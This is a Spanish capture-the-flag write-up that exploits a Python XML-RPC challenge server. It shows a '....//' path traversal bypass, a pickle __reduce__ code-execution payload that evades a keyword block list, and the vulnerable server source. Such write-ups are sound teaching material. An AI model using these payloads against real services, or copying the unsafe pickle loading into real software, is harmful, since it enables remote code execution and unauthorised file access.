@@ -1,0 +1,466 @@
+Sólo nos dan una IP, con lo que hay que escanear puertos para encontrar alguno abierto. Con el nmap encontramos el 12345, es un servidor HTTP que sirve peticiones de XMLRPC.
+
+PORT      STATE SERVICE VERSION
+12345/tcp open  http    BaseHTTP 0.3 (Python SimpleXMLRPCServer; Python 2.7.3)
+|_http-title: Error response
+|_http-methods: No Allow or Public header in OPTIONS response (status code 501)
+
+Así que intentamos conectarnos usando la librería de xmlrpc de Python:
+
+$ python
+Python 2.7.3 (default, Mar 13 2014, 11:03:55) 
+[GCC 4.7.2] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from xmlrpclib import *
+>>> s = ServerProxy("http://target:12345", allow_none=True)
+>>> s.system.listMethods()
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
+    return self.__send(self.__name, args)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
+    verbose=self.__verbose
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
+    return self.single_request(host, handler, request_body, verbose)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1312, in single_request
+    response.msg,
+xmlrpclib.ProtocolError: <ProtocolError for target:12345/RPC2: 501 encoding 'identity' not supported>
+
+El error nos indica que el servidor obligatoriamente requiere algún tipo de encoding. El servidor que viene con Python sólo soporta dos: identity (o sea, sin encoding) y gzip. Así que modificamos el código para forzar el uso de gzip.
+
+>>> t = Transport()
+>>> t.encode_threshold = 0
+>>> s = ServerProxy("http://target:12345", transport=t, allow_none=True)
+>>> s.system.listMethods()
+['get_api_endpoints', 'system.listMethods', 'system.methodHelp', 'system.methodSignature']
+
+Tenemos al parecer una sola llamada, get_api_endpoints. La intentamos llamar.
+
+>>> s.get_api_endpoints()
+['/RPC2', '/random', '/fileserver']
+
+Como /RPC2 es la ruta por defecto para XMLRPC, vamos a suponer que las otras dos son rutas de otros dos servidores XMLRPC virtuales. Lo comprobamos:
+
+>>> s = ServerProxy("http://target:12345/fileserver", transport=t, allow_none=True)
+>>> s.system.listMethods()
+['append', 'delete', 'listdir', 'read', 'system.listMethods', 'system.methodHelp', 'system.methodSignature']
+
+Al parecer tenemos métodos, para listar directorios, para leer (presumiblemente) archivos, etc. Los probamos...
+
+>>> s.listdir()
+['flag.txt']
+
+Esto promete!
+
+>>> print s.read('flag.txt')
+Jack Sparrow: How did you get here?
+Will Turner: Sea turtles, mate. A pair of them strapped to my feet.
+Jack Sparrow: Not so easy, is it?
+
+Bah, era una trampa :D
+
+Veamos que pasa si intentamos abusar de este servicio...
+
+>>> s.read('/etc/passwd')
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
+    return self.__send(self.__name, args)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
+    verbose=self.__verbose
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
+    return self.single_request(host, handler, request_body, verbose)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
+    return self.parse_response(response)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
+    return u.close()
+  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
+    raise Fault(**self._stack[0])
+xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Hacking attempt detected! Your IP address has been traced, an FBI team will soon arrive to your location. Please stay where you are and wait for your arrest.">
+
+Mientras el FBI se acerca a nuestra casa, seguimos investigando. ;)
+
+>>> s.listdir('/')
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
+    return self.__send(self.__name, args)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
+    verbose=self.__verbose
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
+    return self.single_request(host, handler, request_body, verbose)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
+    return self.parse_response(response)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
+    return u.close()
+  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
+    raise Fault(**self._stack[0])
+xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Hacking attempt detected! Your IP address has been traced, an FBI team will soon arrive to your location. Please stay where you are and wait for your arrest.">
+
+Tampoco...
+
+>>> s.listdir('../')
+['flag.txt']
+>>> s.listdir('../../../../')
+['flag.txt']
+
+Uhm, interesante. Nos dio exactamente el mismo resultado que no poner nada.
+
+>>> s.listdir('../../../../etc/passwd')
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
+    return self.__send(self.__name, args)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
+    verbose=self.__verbose
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
+    return self.single_request(host, handler, request_body, verbose)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
+    return self.parse_response(response)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
+    return u.close()
+  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
+    raise Fault(**self._stack[0])
+xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Invalid directory: ./fileserver/etc/passwd">
+
+Ah, ahora sabemos cual es la ruta real donde está el fichero flag.txt. O al menos la ruta relativa a donde está parado el servidor. También sabemos que las secuencias "../" están siendo eliminadas, una solución clásica pero fallida para evitar path traversal.
+
+>>> s.listdir('....//')
+['fileserver', 'supervise', 'server.py', 'run']
+
+Esto tiene mejor pinta - al eliminar '../' de '....//' nos queda nuevamente '../', con lo que podemos listar directorios por encima de la raíz. Sabemos que 'fileserver' es donde están los ficheros que se supone deberían ser los únicos visibles, y ese 'server.py' tiene pinta de ser el servidor con el que estamos hablando. Probemos a leerlo...
+
+>>> s.read('....//server.py')
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
+    return self.__send(self.__name, args)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
+    verbose=self.__verbose
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
+    return self.single_request(host, handler, request_body, verbose)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
+    return self.parse_response(response)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
+    return u.close()
+  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
+    raise Fault(**self._stack[0])
+xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Hacking attempt detected! Your IP address has been traced, an FBI team will soon arrive to your location. Please stay where you are and wait for your arrest.">
+
+Ups, con esta llamada no funciona el bug! Bueno, pero todavía nos queda un servicio que explorar...
+
+>>> s = ServerProxy("http://target:12345/random", transport=t, allow_none=True)
+>>> s.system.listMethods()
+['getstate', 'random', 'seed', 'setstate', 'system.listMethods', 'system.methodHelp', 'system.methodSignature']
+
+Parecería ser un generador de pseudoazar...
+
+>>> s.random()
+0.891038931836746
+>>> s.random()
+0.45602713966818337
+>>> s.random()
+0.9581700716673957
+>>> s.random()
+0.22924179661741917
+
+Si, eso parece. Veamos que nos devuelve getstate...
+
+>>> s.getstate()
+'KEkxCihJNDkzOApJMjc0NDYKSTQ4NjcKdHAxCk50Lg==\n'
+
+Eso es base64, si lo decodificamos...
+
+>>> s.getstate().decode('base64')
+'(I1\n(I4938\nI27446\nI4867\ntp1\nNt.'
+
+Esto ya es un poco misterioso, pero con un poco de ojo y paciencia adivinamos que es el formato pickle de serialización de objetos en Python.
+
+>>> from cPickle import *
+>>> loads(s.getstate().decode('base64'))
+(1, (4938, 27446, 4867), None)
+
+Ya sabiendo el formato, probemos a mandarle algo...
+
+>>> s.setstate(dumps((1, (4938, 27446, 4867), None)).encode('base64'))
+>>> s.setstate(dumps((1, (4938, 27446, 0), None)).encode('base64'))
+>>> s.setstate(dumps((1, (4938, 0, 0), None)).encode('base64'))
+>>> s.setstate(dumps((1, (0, 0, 0), None)).encode('base64'))
+>>> s.setstate(dumps((0, (0, 0, 0), None)).encode('base64'))
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
+    return self.__send(self.__name, args)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
+    verbose=self.__verbose
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
+    return self.single_request(host, handler, request_body, verbose)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
+    return self.parse_response(response)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
+    return u.close()
+  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
+    raise Fault(**self._stack[0])
+xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Invalid state data">
+
+Pero lo interesante aquí es que acepta datos en formato pickle, que es vulnerable a inyección remota de código, con lo que podemos ejecutar el código Python que queramos. Con esto vamos a poder leer el código del servidor, por ejemplo copiándolo a la carpeta a la que sí tenemos acceso.
+
+>>> class Exploit(object):
+...   def __reduce__(self):
+...     import os
+...     return (os.system, ('cp ./server.py ./fileserver/server.py',))
+... 
+>>> s.setstate(dumps(Exploit()).encode('base64'))
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
+    return self.__send(self.__name, args)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
+    verbose=self.__verbose
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
+    return self.single_request(host, handler, request_body, verbose)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
+    return self.parse_response(response)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
+    return u.close()
+  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
+    raise Fault(**self._stack[0])
+xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Hacking attempt detected! Your IP address has been traced, an FBI team will soon arrive to your location. Please stay where you are and wait for your arrest.">
+
+Se ha dado cuenta! Pero visto lo visto, fijo que la seguridad aquí tampoco va muy fina, vamos a probar algunas cosas mas...
+
+>>> class Exploit(object):
+...   def __reduce__(self):
+...     import shutil
+...     return (shutil.copyfile, ('./server.py', './fileserver/server.py'))
+... 
+>>> s.setstate(dumps(Exploit()).encode('base64'))
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
+    return self.__send(self.__name, args)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
+    verbose=self.__verbose
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
+    return self.single_request(host, handler, request_body, verbose)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
+    return self.parse_response(response)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
+    return u.close()
+  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
+    raise Fault(**self._stack[0])
+xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Invalid state data">
+
+Ajá! Ya no nos lo detecta. Está bien que se queje, porque no le estamos mandando datos válidos. Verifiquemos si ha funcionado la inyección de código.
+
+>>> s = ServerProxy("http://target:12345/fileserver", transport=t, allow_none=True)
+>>> s.listdir()
+['flag.txt', 'server.py']
+
+Ha funcionado! Ahora con el método 'read' podemos leer el contenido del fichero, sabiendo así cómo funciona el servidor.
+
+--------------------------------------------------------------------------------
+#!/usr/bin/env python
+
+from cPickle import loads, dumps
+from hashlib import sha1
+from os import listdir, unlink
+from os.path import abspath, dirname, join
+from random import WichmannHill
+from SimpleXMLRPCServer import MultiPathXMLRPCServer, SimpleXMLRPCRequestHandler, SimpleXMLRPCDispatcher
+
+class RandomServer(object):
+
+    def __init__(self):
+        self.rnd = WichmannHill()
+
+    def seed(self, num):
+        """Set the seed for the random number generator."""
+        self.rnd.seed(num)
+
+    def random(self):
+        """Get a random number."""
+        try:
+            return self.rnd.random()
+        except Exception:
+            raise ValueError("Invalid seed value")
+
+    def getstate(self):
+        """Get the state of the random number generator."""
+        return dumps(self.rnd.getstate()).encode("base64")
+
+    def setstate(self, state):
+        """Restore the state of the random number generator."""
+        state = state.decode("base64")
+        test = state.lower()
+        if "system" in test or "/bin/sh" in test or "popen" in test or "proc" in test:
+            raise ValueError(
+                "Hacking attempt detected! Your IP address has been traced, "
+                "an FBI team will soon arrive to your location. Please stay "
+                "where you are and wait for your arrest.")
+        try:
+            self.rnd.setstate(loads(state))
+        except Exception:
+            raise ValueError("Invalid state data")
+
+class FileServer(object):
+
+    def listdir(self, directory = "."):
+        """Get a directory listing. Optionally specify a directory to list."""
+        directory = directory.replace("../", "")
+        rootdir = join(dirname(__file__), "fileserver")
+        directory = join(rootdir, directory)
+        if not directory.startswith(rootdir):
+            raise ValueError(
+                "Hacking attempt detected! Your IP address has been traced, "
+                "an FBI team will soon arrive to your location. Please stay "
+                "where you are and wait for your arrest.")
+        try:
+            return listdir(directory)
+        except Exception:
+            raise ValueError("Invalid directory: %s" % directory)
+
+    def read(self, filename):
+        """Get the contents of a file."""
+        filename = filename.replace("../", "")
+        rootdir = abspath(join(dirname(__file__), "fileserver"))
+        filename = abspath(join(rootdir, filename))
+        if not filename.startswith(rootdir):
+            raise ValueError(
+                "Hacking attempt detected! Your IP address has been traced, "
+                "an FBI team will soon arrive to your location. Please stay "
+                "where you are and wait for your arrest.")
+        try:
+            with open(filename, "rb") as fd:
+                return fd.read()
+        except Exception:
+            raise ValueError("Invalid filename: %s" % filename)
+
+    def append(self, filename, data):
+        """Append data to the end of a file."""
+        filename = filename.replace("../", "")
+        rootdir = abspath(join(dirname(__file__), "fileserver"))
+        filename = abspath(join(rootdir, filename))
+        if not filename.startswith(rootdir):
+            raise ValueError(
+                "Hacking attempt detected! Your IP address has been traced, "
+                "an FBI team will soon arrive to your location. Please stay "
+                "where you are and wait for your arrest.")
+        try:
+            with open(filename, "ab") as fd:
+                return fd.write(data)
+        except Exception:
+            raise ValueError("Invalid filename: %s" % filename)
+
+    def delete(self, filename):
+        """Delete a file."""
+        filename = filename.replace("../", "")
+        rootdir = abspath(join(dirname(__file__), "fileserver"))
+        filename = abspath(join(rootdir, filename))
+        if not filename.startswith(rootdir):
+            raise ValueError(
+                "Hacking attempt detected! Your IP address has been traced, "
+                "an FBI team will soon arrive to your location. Please stay "
+                "where you are and wait for your arrest.")
+        try:
+            unlink(filename)
+        except Exception:
+            raise ValueError("Invalid filename: %s" % filename)
+
+class SecretServer(object):
+
+    def get_answer_to_life_the_universe_and_everything(self):
+        return 42
+
+    def get_number_one_source_for_the_truth(self):
+        return "http://www.truthism.com/"
+
+    def get_secrets_of_time_travel(self):
+        return "https://www.google.com/search?q=John+Titor"
+
+    def get_world_nuclear_launch_codes(self):
+        return "NCN" + sha1("New World Order").hexdigest()
+
+class InfoServer(object):
+    def get_api_endpoints(self):
+        """Enumerate all public API endpoints."""
+        return [
+            x for x in RequestHandler.rpc_paths
+            if not x.startswith("/secret_")
+        ]
+
+class RequestHandler(SimpleXMLRPCRequestHandler):
+    encode_threshold = 0
+    rpc_paths = (
+        "/RPC2",
+        "/random",
+        "/fileserver",
+        "/secret_illuminati_world_domination_plans"
+    )
+
+    def decode_request_content(self, data):
+        encoding = self.headers.get("content-encoding", "identity").lower()
+        if encoding != "gzip":
+            self.send_response(501, "encoding %r not supported" % encoding)
+        return SimpleXMLRPCRequestHandler.decode_request_content(self, data)
+
+if __name__ == "__main__":
+
+    server = MultiPathXMLRPCServer(("0.0.0.0", 12345),
+                requestHandler=RequestHandler,
+                allow_none=True, encoding="utf8")
+
+    random_server = SimpleXMLRPCDispatcher(allow_none=True, encoding="utf8")
+    random_server.register_introspection_functions()
+    random_server.register_instance(RandomServer())
+    server.add_dispatcher("/random", random_server)
+
+    file_server = SimpleXMLRPCDispatcher(allow_none=True, encoding="utf8")
+    file_server.register_introspection_functions()
+    file_server.register_instance(FileServer())
+    server.add_dispatcher("/fileserver", file_server)
+
+    secret_server = SimpleXMLRPCDispatcher(allow_none=True, encoding="utf8")
+    secret_server.register_introspection_functions()
+    secret_server.register_instance(SecretServer())
+    server.add_dispatcher("/secret_illuminati_world_domination_plans", secret_server)
+
+    info_server = SimpleXMLRPCDispatcher(allow_none=True, encoding="utf8")
+    info_server.register_introspection_functions()
+    info_server.register_instance(InfoServer())
+    server.add_dispatcher("/RPC2", info_server)
+
+    server.serve_forever()
+--------------------------------------------------------------------------------
+
+Ya tenemos todo lo que necesitamos, leyendo el fuente podemos entender lo que hace y calcular el flag. Pero para qué? El propio servidor nos la va a dar, si se lo pedimos ;) porque resulta que hay un endpoint que no estaba siendo listado!
+
+>>> s = ServerProxy("http://target:12345/secret_illuminati_world_domination_plans", transport=t, allow_none=True)
+>>> s.system.listMethods()
+['get_answer_to_life_the_universe_and_everything', 'get_number_one_source_for_the_truth', 'get_secrets_of_time_travel', 'get_world_nuclear_launch_codes', 'system.listMethods', 'system.methodHelp', 'system.methodSignature']
+>>> s.get_answer_to_life_the_universe_and_everything()
+42
+>>> s.get_number_one_source_for_the_truth()
+'http://www.truthism.com/'
+>>> s.get_secrets_of_time_travel()
+'https://www.google.com/search?q=John+Titor'
+>>> s.get_world_nuclear_launch_codes()
+'NCN298f74dba8de5945adb45b0fb43a4a4f141b8bfa'
+
+El último es el flag, las demás frikadas no las voy a explicar porque es más divertido averiguarlas por cuenta propia. ;)
+
+El código que genera el flag es el siguiente:
+
+    def get_world_nuclear_launch_codes(self):
+        return "NCN" + sha1("New World Order").hexdigest()
+
+Finalmente, borramos el fichero server.py para no hacérselo demasiado fácil a los demás equipos ;)
+
+>>> s = ServerProxy("http://target:12345/fileserver", transport=t, allow_none=True)
+>>> s.delete('server.py')
+>>> s.listdir()
+['flag.txt']
+
+Aunque nos hubiéramos ahorrado este paso si hubiéramos usado un nombre de fichero oculto (o sea, comenzando por un punto), ya que el método listdir sólo muestra ficheros que no estén ocultos.
+
+
